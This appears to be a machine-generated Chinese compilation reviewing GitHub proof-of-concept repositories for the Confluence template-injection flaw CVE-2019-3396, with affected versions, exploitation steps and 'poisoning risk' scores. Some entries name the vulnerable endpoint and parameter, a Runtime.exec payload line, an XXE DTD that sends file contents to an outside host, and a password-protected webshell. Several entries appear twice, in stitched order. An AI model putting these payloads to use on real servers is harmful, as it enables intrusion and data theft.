*   **漏洞库信息：** 提供了漏洞的官方描述、受影响版本和修复建议，是了解漏洞细节的重要来源。

**项目地址:** [kh4sh3i/CVE-2019-3396](https://github.com/kh4sh3i/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #13

**来源**: [CVE-2019-3396-pyn3rd_CVE-2019-3396.md](../2019/CVE-2019-3396-pyn3rd_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence Server或Data Center实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前。

**利用条件:** 需要 Confluence 实例启用了 Widget Connector 宏，并且攻击者可以访问包含该宏的页面。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。 远程攻击者可以通过构造恶意的 Velocity 模板代码，利用该宏执行任意代码。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用是有效的。提供的POC代码包含两个文件：`calc.vm` 和 `os.vm`。

*   `calc.vm`: 该文件使用 Velocity 模板语言执行命令 `calc`（在Windows系统中会打开计算器）。这表明该漏洞能够执行任意命令。
*   `os.vm`: 该文件使用 Velocity 模板语言获取系统属性 `user.dir` (用户工作目录) 和 `user.name` (用户名)。这表明该漏洞可以读取服务器上的敏感信息。

利用方式：

1.  攻击者找到或创建一个包含 Widget Connector 宏的 Confluence 页面。
2.  攻击者在 Widget Connector 宏中插入恶意的 Velocity 模板代码，例如 `calc.vm` 或 `os.vm` 中的代码。
3.  当 Confluence 服务器渲染该页面时，会执行 Velocity 模板代码，从而导致远程代码执行或信息泄露。

关于投毒风险：

提供的POC代码没有明显的投毒代码。`calc.vm` 只是为了验证远程代码执行，`os.vm` 只是读取系统属性。此处的“投毒”指的是在POC中包含一些恶意代码，使得在测试漏洞时不经意间执行了恶意操作，或者留下后门。 提供的代码没有这种行为，因此投毒风险评估为0%。搜索引擎的结果也显示该漏洞在野外被利用来传播恶意软件，如加密货币矿工和勒索软件，表明该漏洞的真实风险很高。


**项目地址:** [pyn3rd/CVE-2019-3396](https://github.com/pyn3rd/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #14

**来源**: [CVE-2019-3396-quanpt103_CVE-2019-3396.md](../2019/CVE-2019-3396-quanpt103_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 小于6.6.12，6.7.0到小于6.12.3，6.13.0到小于6.13.3，6.14.0到小于6.14.2

**利用条件:** 需要 Confluence 实例存在 Widget Connector 宏，且目标版本未修复漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中。攻击者可以利用服务器端模板注入漏洞 (SSTI) 远程执行代码。根据漏洞库信息和搜索结果，该漏洞已经被广泛利用。提供的 POC 代码使用 Velocity 模板语言，尝试通过 `java.lang.Runtime` 类执行 `ipconfig` 命令。该命令本身无害，用于验证漏洞是否存在。由于poc只执行ipconfig命令，没有发现任何投毒代码。利用方式是构造恶意的 Velocity 模板，通过 Widget Connector 宏注入，从而在服务器上执行任意命令。

**项目地址:** [quanpt103/CVE-2019-3396](https://github.com/quanpt103/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #15

**来源**: [CVE-2019-3396-s1xg0d_CVE-2019-3396.md](../2019/CVE-2019-3396-s1xg0d_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence

**危害等级:** 高危，可能导致远程代码执行 (RCE) 和敏感信息泄露

**影响版本:** Confluence Server before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要能够向 Confluence Server 发送 HTTP 请求,并且 Widget Connector 宏可用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2019-3396 是 Atlassian Confluence 中 Widget Connector 宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板代码，利用 Widget Connector 宏的参数，在服务器端执行任意代码。

**有效性评估:**
根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞的POC代码是有效的。Exploit-DB 上的 46731 提供了利用该漏洞的 PoC。搜索引擎结果中也提到多个 PoC 的分析和实际攻击事件。

**投毒风险分析:**
提供的代码包含以下文件：
*   `README.md`: 描述了漏洞 CVE-2019-3396
*   `cmd.vm`: Velocity 模板，用于执行命令。该文件通过 Java 反射调用 `java.lang.Runtime` 来执行系统命令，其中 `$cmd` 变量应该是由攻击者控制的参数。
*   `evil.dtd`: 用于 XXE (XML External Entity) 攻击，尝试通过外部实体引入远程文件。此文件配置为访问 `http://phpshexxe.abcdef.5o1.in/?%file;` 看起来是一个尝试进行数据外泄的 URL
*   `os.vm`: Velocity 模板，用于获取服务器的操作系统信息和用户目录。它使用 Java 反射调用 `java.lang.System` 来获取系统属性。

`evil.dtd` 中的外部连接可能存在一定的风险，可能将服务器的文件内容发送到 `phpshexxe.abcdef.5o1.in`。这是一种潜在的数据泄露尝试。如果攻击者控制了该域名，他们就可以接收到 Confluence 服务器的文件内容。`phpshexxe.abcdef.5o1.in` 这个域名很可疑，具有进行恶意数据收集或攻击的可能性。但此行为更像是payload的一部分而非投毒。所以，投毒的概率相对较低，约为 5%。

**利用方式:**
利用方式主要包括以下步骤：

1.  **构造恶意 Velocity 模板:** 攻击者构造包含恶意代码的 Velocity 模板，例如 `cmd.vm` 中利用 Java 反射执行系统命令的代码。
2.  **利用 Widget Connector 宏:** 攻击者利用 Confluence 的 Widget Connector 宏，将构造好的恶意 Velocity 模板作为宏的参数传递给服务器。
3.  **服务器端执行:** Confluence 服务器解析 Widget Connector 宏时，会执行恶意 Velocity 模板中的代码，从而实现远程代码执行。
4. **XXE攻击:** `evil.dtd`文件可以配合其他payload尝试读取服务器文件，但依赖于服务器是否允许外部实体的解析。

总而言之，该漏洞的利用方式是典型的服务器端模板注入攻击，攻击者通过控制模板内容来执行任意代码。

**项目地址:** [s1xg0d/CVE-2019-3396](https://github.com/s1xg0d/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #16

**来源**: [CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md](../2019/CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md)

## CVE-2019-3396-Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器开启Widget Connector宏功能，并且攻击者能够访问该宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中的一个服务器端模板注入漏洞，存在于Widget Connector宏中。攻击者可以通过构造恶意的Velocity模板代码，利用此漏洞在Confluence服务器上执行任意代码。

**有效性:**
从漏洞库信息和搜索结果来看，此漏洞已被广泛证实存在，并且有公开的PoC（概念验证）代码。
提供的POC代码包含以下文件：
* `README.md`: 说明文件，描述漏洞和PoC的使用方法。
* `_template_test_info.txt`: 用于验证模板是否加载成功的简单文本文件。
* `rce.vm`: 包含Velocity模板代码，用于执行远程命令。
`rce.vm`中使用了Java反射来获取Runtime类，并执行指定的命令。这个PoC代码是有效的，可以用来验证漏洞是否存在。

**投毒风险:**
提供的PoC代码仅包含漏洞验证和利用的必要代码，没有发现任何隐藏的恶意代码或后门。因此，投毒风险为0%。

**利用方式:**
1.  攻击者需要找到一个Confluence页面，该页面使用了Widget Connector宏。
2.  攻击者在Widget Connector宏的配置中插入恶意的Velocity模板代码，例如`rce.vm`中的代码。
3.  当Confluence服务器渲染该页面时，会执行攻击者插入的Velocity模板代码，从而实现远程代码执行。
4.  攻击者可以利用此漏洞在服务器上执行任意命令，例如安装恶意软件、窃取敏感数据等。

**参考信息:**
*   NVD: [https://nvd.nist.gov/vuln/detail/cve-2019-3396](https://nvd.nist.gov/vuln/detail/cve-2019-3396)
*   Rapid7: [https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/](https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/)
*   Exploit-DB: [https://www.exploit-db.com/exploits/46731/](https://www.exploit-db.com/exploits/46731/)
*   CISA KEV: [https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396)

**项目地址:** [skommando/CVE-2019-3396-confluence-poc](https://github.com/skommando/CVE-2019-3396-confluence-poc)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #17

**来源**: [CVE-2019-3396-tanw923_test1.md](../2019/CVE-2019-3396-tanw923_test1.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且允许未授权访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞。攻击者可以通过操纵 Widget Connector 宏，注入恶意 Velocity 模板代码，从而在 Confluence 服务器上执行任意代码。

**有效性评估：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断此漏洞利用的有效性较高。漏洞库信息明确指出此漏洞允许远程攻击者通过服务器端模板注入实现路径遍历和远程代码执行。搜索引擎结果中也包含了大量的漏洞分析报告和利用示例，确认了该漏洞在野外已被积极利用，并可能被用于传播勒索软件或恶意挖矿程序。提供的POC代码仓库是一个简单的EXP，说明该漏洞存在可利用的POC.

**投毒风险评估：**

提供的代码片段 `include_1.jsp` 看起来像一个 Webshell，具备文件管理、数据库操作、命令执行等功能。 恶意代码比例较低，因为其本身就是webshell，为了完成漏洞的验证。因此投毒风险评估为 10%，这个比例反映了作者可能隐藏的用于维持权限或进行进一步攻击的代码的可能性，但主要功能是完成POC验证。

**利用方式分析：**

1.  **确定目标：** 找到存在漏洞版本的Confluence Server。
2.  **构造 Payload：** 构建包含恶意 Velocity 模板代码的请求。Payload通常利用`Widget Connector`宏的缺陷，将恶意代码注入到模板中。
3.  **发送请求：** 将构造好的 Payload 发送到目标 Confluence Server，触发模板引擎执行恶意代码。
4.  **远程代码执行：**  成功利用漏洞后，攻击者可以在目标服务器上执行任意命令，例如部署 Webshell、窃取敏感数据或进行其他恶意活动。

提供的`include_1.jsp` 文件实际上是一个后门，攻击者可以通过访问这个JSP页面并提供正确的密码（`xiaoma`）来执行各种操作，例如文件管理、数据库操作、命令执行等。利用漏洞部署webshell后，可以实现对服务器的控制。攻击者可以在服务器上上传、下载、修改和删除文件，查看和修改数据库中的数据，以及执行任意的系统命令。

**项目地址:** [tanw923/test1](https://github.com/tanw923/test1)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #18

**来源**: [CVE-2019-3396-tno01_cve-2019-3396.md](../2019/CVE-2019-3396-tno01_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 < version < 6.13.3, 6.14.0 < version < 6.14.2

**利用条件:** 需要能够访问存在 Widget Connector 宏的 Confluence 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞是 Atlassian Confluence Server 和 Data Center 中的一个服务器端模板注入（SSTI）漏洞。它存在于 Widget Connector 宏中，允许未经身份验证的远程攻击者通过构造恶意的 Velocity 模板，实现路径遍历和远程代码执行。漏洞影响的版本包括 6.6.12 之前的 6.6.x 版本，6.7.0 到 6.12.3 之前的 6.12.x 版本，6.13.0 到 6.13.3 之前的 6.13.x 版本，以及 6.14.0 到 6.14.2 之前的 6.14.x 版本。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞被广泛利用，存在公开的漏洞利用代码（例如 Exploit-DB 46731）。该漏洞已被 CISA 添加到已知被利用的漏洞目录中，表明其真实性和严重性。提供的 POC 代码 `/tmp/deed01dabaaab5a9c3b0b4b4d2014a34/README.md`  内容过于简单,仅包含标题 `# cve-2019-3396`，可能只是一个占位符，说明 POC 是存在的，但**需要结合其他信息确认具体的payload**。

**投毒风险：**

提供的 POC 代码只有一个 README 文件，内容非常简单，几乎没有投毒的可能。但是，完整的漏洞利用代码可能包含恶意代码。因为此README.md文件只是整个POC代码的一个组成部分. 考虑漏洞利用的复杂性和潜在的风险,投毒风险评估为10%。

**利用方式：**

1.  **定位存在 Widget Connector 宏的页面：**  攻击者需要找到 Confluence 实例中使用了 Widget Connector 宏的页面。
2.  **构造恶意 Velocity 模板：**  攻击者构造包含恶意代码的 Velocity 模板。该模板将被注入到 Widget Connector 宏中。
3.  **服务器端模板注入：**  当 Confluence 服务器渲染包含恶意模板的页面时，Velocity 引擎会执行模板中的代码，从而导致服务器端代码执行。
4.  **远程代码执行：**  攻击者通过执行任意代码来控制 Confluence 服务器，可能包括执行系统命令、安装恶意软件等。

根据搜索结果中的一些文章，该漏洞已被用于传播加密货币矿工、GandCrab 勒索软件和 AESDDoS 僵尸网络恶意软件。

**项目地址:** [tno01/cve-2019-3396](https://github.com/tno01/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #19

**来源**: [CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md](../2019/CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.0 - 6.6.11, 6.7.0 - 6.12.2, 6.13.0 - 6.13.2, 6.14.0 - 6.14.1

**利用条件:** 需要能够访问存在漏洞的Confluence服务器，并能够在Confluence页面中插入或修改内容以利用 Widget Connector macro。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector macro 中，允许未经身份验证的远程攻击者通过服务器端模板注入 (SSTI) 执行任意代码。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector macro 渲染该模板，从而在 Confluence 服务器上执行命令。

**有效性：**
根据提供的漏洞信息，搜索引擎结果和漏洞利用代码，可以判断此漏洞是有效的。漏洞库信息明确指出该漏洞允许远程攻击者实现路径遍历和远程代码执行，搜索引擎结果中的文章也表明此漏洞已被积极利用，甚至被用于传播恶意软件。

**投毒风险：**
提供的漏洞利用代码主要包含以下几个文件：
*   `README.md`: 描述文件
*   `cmd.vm`, `cmd1.vm`, `cmd3.vm`: 包含 Velocity 模板代码，用于执行命令。这三个文件除了注释略有不同，核心代码相同。

代码的主要功能是：
1.  获取 Java Runtime 实例。
2.  执行用户提供的命令 (`$cmd`)。
3.  获取命令执行的输出流。
4.  使用 Scanner 读取输出流。
5.  返回命令执行的结果。

投毒风险分析：
由于这些脚本主要是为了执行任意命令，存在被用于恶意目的的风险。例如，攻击者可能会修改这些脚本，使其在执行目标命令的同时，执行一些隐蔽的恶意操作，如安装后门、收集敏感信息等。如果未经授权的人修改或者发布这些脚本，投毒风险就会提升。 总体来说，这些PoC更多的是payload，本身是无害的，风险主要来源于使用它们的人。但作者也可能在代码中隐藏一些不易察觉的后门代码，比如添加一个额外的命令执行，或者上传收集到的信息到恶意服务器。因此，存在一定的投毒风险，估计为 10%。

**利用方式：**
1.  攻击者需要构造包含恶意 Velocity 模板的 Confluence 页面或修改现有页面。
2.  利用 Widget Connector macro 渲染该恶意模板。
3.  恶意模板中的代码会在 Confluence 服务器上执行，从而实现远程代码执行。
4.  `$cmd` 变量需要通过某种方式传递到 Velocity 模板中，例如通过构造特定的请求参数。

总而言之，此漏洞的利用方式是通过构造恶意的Velocity模板，利用Confluence的Widget Connector Macro组件进行渲染，从而达到远程代码执行的目的。

**项目地址:** [vntest11/confluence_CVE-2019-3396](https://github.com/vntest11/confluence_CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #20

**来源**: [CVE-2019-3396-x-f1v3_CVE-2019-3396.md](../2019/CVE-2019-3396-x-f1v3_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Server-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 版本低于 6.6.12，6.7.0 到 6.12.3 之间，6.13.0 到 6.13.3 之间，6.14.0 到 6.14.2 之间

**利用条件:** 需要网络访问到Confluence服务器

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用 Velocity 模板引擎执行任意代码，从而实现远程代码执行。

**有效性：**

提供的POC代码是有效的。它演示了两种利用方式：

*   **远程代码执行（RCE）：** 通过修改`_template`参数，指向包含恶意 Velocity 模板的远程文件（1.vm）。该模板使用`java.lang.Runtime`类执行`ping your.dns.log`命令，可以验证RCE是否成功，同时可以替换成其他的恶意命令。
*   **本地文件包含（LFI）：** 通过修改`_template`参数，指向服务器上的敏感文件，如`../web.xml`，从而读取服务器上的文件内容。

**投毒风险：**

该存储库被投毒的风险较低，约为10%。判断依据如下：

*   仓库本身较为简单，只有一个RCE的vm文件和readme。从代码本身来看，恶意代码的可能性较低。
*   代码片段是直接命令ping，没有很强的迷惑性，因此投毒概率低。
*   参考搜索结果，此漏洞已经被广泛利用，出现恶意利用的情况，但POC本身相对直接。

**利用方式：**

1.  确定目标 Confluence Server 存在 CVE-2019-3396 漏洞。
2.  构造包含恶意 Velocity 模板的 HTTP POST 请求，发送到`/rest/tinymce/1/macro/preview`端点。
3.  在请求体中，设置`macro.params._template`参数为恶意 Velocity 模板的 URL 或目标服务器上的文件路径。
4.  发送请求后，如果漏洞存在，Confluence Server 将执行恶意 Velocity 模板中的代码，导致 RCE 或 LFI。

**示例：**

利用 RCE POC，攻击者可以通过修改 Velocity 模板中的命令，执行任意系统命令，例如上传 webshell、添加用户等。

利用 LFI POC，攻击者可以读取 Confluence Server 上的敏感配置文件，例如数据库连接信息、管理员密码等。

**注意：**

利用此漏洞进行攻击是非法的，仅供安全研究和渗透测试使用。

**项目地址:** [x-f1v3/CVE-2019-3396](https://github.com/x-f1v3/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #21

**来源**: [CVE-2019-3396-xiaoshuier_CVE-2019-3396.md](../2019/CVE-2019-3396-xiaoshuier_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本包括6.6.12之前, 6.7.0 - 6.12.3之前, 6.13.0 - 6.13.3之前, 6.14.0 - 6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏并且允许用户插入恶意模板。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是一个 Atlassian Confluence Server 中的服务器端模板注入漏洞。该漏洞存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板引擎执行任意代码。提供的POC代码使用Velocity模板语言，通过 `java.lang.Runtime` 类执行系统命令。此示例中，POC代码尝试启动 macOS 计算器应用程序。该POC的有效性取决于Confluence服务器上Velocity模板引擎的配置以及是否有安全策略阻止执行任意Java代码。根据搜索结果,此漏洞已被广泛利用,包括部署加密货币挖矿恶意软件和GandCrab勒索软件。

**利用方式：**
攻击者构造包含恶意Velocity模板代码的请求，Confluence服务器解析该模板时会执行攻击者注入的命令。通常是通过修改页面内容，添加包含恶意代码的Widget Connector宏来实现。

**投毒风险评估：**
提供的POC代码本身功能明确，即执行指定的系统命令。其中`/Applications/Calculator.app/Contents/MacOS/Calculator` 这个路径只是一个PoC，用于验证是否存在RCE，如果攻击者将这个路径改成下载恶意软件的命令,这可能会被识别为投毒。 除非攻击者能够找到方法在该POC中隐藏其他恶意行为（例如通过Base64编码或其他混淆技术隐藏反弹shell代码），否则直接的投毒风险较低。但是，攻击者可以修改这个PoC中的执行命令为任意命令，存在一定的投毒风险，所以风险比例为10%。

**项目地址:** [xiaoshuier/CVE-2019-3396](https://github.com/xiaoshuier/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #22

**来源**: [CVE-2019-3396-yuehanked_cve-2019-3396.md](../2019/CVE-2019-3396-yuehanked_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Macro-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 6.6.0 < version < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标系统存在受影响版本的Confluence，并且Widget Connector宏未被禁用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中 Widget Connector 宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector 宏在 Confluence 服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，该漏洞真实存在，且存在公开的PoC。提供的PoC代码 `windows.vm` 利用了 Velocity 模板引擎的特性，通过反射调用 `java.lang.Runtime` 类来执行系统命令。代码首先设置变量`e`为字符串"exp"，然后使用反射获取Runtime类的getRuntime()方法并调用，执行`cmd.exe /c $cmd`。 `$cmd` 变量需要在实际利用时替换为要执行的命令。该PoC代码有效。

**投毒风险分析：**

提供的PoC代码本身的功能是执行任意命令，虽然其中使用了`cmd.exe /c $cmd`，但正常使用该漏洞也需要用户传入执行命令，因此代码的功能就是利用漏洞进行RCE。 但需要评估是否存在作者故意添加的恶意代码，例如：

1.  **隐蔽的后门：** 代码中是否存在难以察觉的命令，用于植入后门或收集信息？
2.  **条件触发的恶意行为：** 代码是否包含在特定条件下才会触发的恶意行为？

假设存在一些不明显的行为（例如每隔一段时间尝试连接某个IP，或者尝试修改某些配置），则投毒风险可能较高。综合考虑POC本身的功能与检查隐藏的恶意行为的难度，评估投毒风险为 10%。

**利用方式分析：**

1.  **查找包含 Widget Connector 宏的 Confluence 页面。**
2.  **构造包含恶意 Velocity 模板的请求。** 这个模板通常会利用 Velocity 的表达式注入功能来执行任意代码。
3.  **发送构造好的请求到 Confluence 服务器。**
4.  **服务器解析 Velocity 模板，执行其中的恶意代码，实现远程代码执行。**

根据搜索结果，该漏洞已经被广泛利用，并且有多种攻击载荷被用于攻击。例如，有攻击者利用该漏洞部署加密货币挖矿程序和 Gandcrab 勒索软件。

**项目地址:** [yuehanked/cve-2019-3396](https://github.com/yuehanked/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---



---

## POC #12

**来源**: [CVE-2019-3396-kh4sh3i_CVE-2019-3396.md](../2019/CVE-2019-3396-kh4sh3i_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Server-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行

**影响版本:** 受影响版本：6.6.12之前, 6.7.0到6.12.3之前, 6.13.0到6.13.3之前, 6.14.0到6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入恶意模板

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是一个存在于Atlassian Confluence Server中的服务器端模板注入漏洞。该漏洞位于Widget Connector宏中，允许未经身份验证的远程攻击者利用Velocity模板引擎的缺陷执行任意代码。攻击者可以通过构造恶意的Widget Connector宏参数，将恶意Velocity模板注入到服务器端，从而执行任意系统命令。

**有效性评估：**

根据漏洞库信息和搜索结果，该漏洞是一个严重的安全问题，已被广泛利用，存在公开的POC（Proof of Concept）代码。

**投毒风险评估：**

提供的代码段仅包含CC0 1.0通用许可协议的文本。此代码段本身不包含任何可执行代码或恶意指令，因此不存在投毒风险的可能性。投毒风险为0%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **漏洞发现：** 确认目标Confluence服务器运行的是受影响的版本。
2.  **构造Payload：** 构建包含恶意Velocity模板的HTTP请求。这个payload通常会利用`#set`指令来定义变量，并使用`$Runtime.getRuntime().exec()`方法来执行系统命令。示例：`\u0024\{Runtime.getRuntime().exec("touch /tmp/success")\}` 
3.  **发送请求：** 将构造好的请求发送到Confluence服务器的Widget Connector宏处理端点。
4.  **代码执行：** 如果漏洞利用成功，服务器将执行payload中的系统命令。

**排序优先级解释：**

*   **搜索引擎结果：** 提供了漏洞的背景信息、影响和利用案例，有助于快速了解漏洞的严重程度和影响范围。
*   **漏洞利用代码：**  POC代码直接展示了漏洞的利用方式，可以用于验证漏洞和进行渗透测试。
*   **漏洞库信息：** 提供了漏洞的官方描述、受影响版本和修复建议，是了解漏洞细节的重要来源。

**项目地址:** [kh4sh3i/CVE-2019-3396](https://github.com/kh4sh3i/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #13

**来源**: [CVE-2019-3396-pyn3rd_CVE-2019-3396.md](../2019/CVE-2019-3396-pyn3rd_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence Server或Data Center实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前。

**利用条件:** 需要 Confluence 实例启用了 Widget Connector 宏，并且攻击者可以访问包含该宏的页面。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。 远程攻击者可以通过构造恶意的 Velocity 模板代码，利用该宏执行任意代码。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用是有效的。提供的POC代码包含两个文件：`calc.vm` 和 `os.vm`。

*   `calc.vm`: 该文件使用 Velocity 模板语言执行命令 `calc`（在Windows系统中会打开计算器）。这表明该漏洞能够执行任意命令。
*   `os.vm`: 该文件使用 Velocity 模板语言获取系统属性 `user.dir` (用户工作目录) 和 `user.name` (用户名)。这表明该漏洞可以读取服务器上的敏感信息。

利用方式：

1.  攻击者找到或创建一个包含 Widget Connector 宏的 Confluence 页面。
2.  攻击者在 Widget Connector 宏中插入恶意的 Velocity 模板代码，例如 `calc.vm` 或 `os.vm` 中的代码。
3.  当 Confluence 服务器渲染该页面时，会执行 Velocity 模板代码，从而导致远程代码执行或信息泄露。

关于投毒风险：

提供的POC代码没有明显的投毒代码。`calc.vm` 只是为了验证远程代码执行，`os.vm` 只是读取系统属性。此处的“投毒”指的是在POC中包含一些恶意代码，使得在测试漏洞时不经意间执行了恶意操作，或者留下后门。 提供的代码没有这种行为，因此投毒风险评估为0%。搜索引擎的结果也显示该漏洞在野外被利用来传播恶意软件，如加密货币矿工和勒索软件，表明该漏洞的真实风险很高。


**项目地址:** [pyn3rd/CVE-2019-3396](https://github.com/pyn3rd/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #14

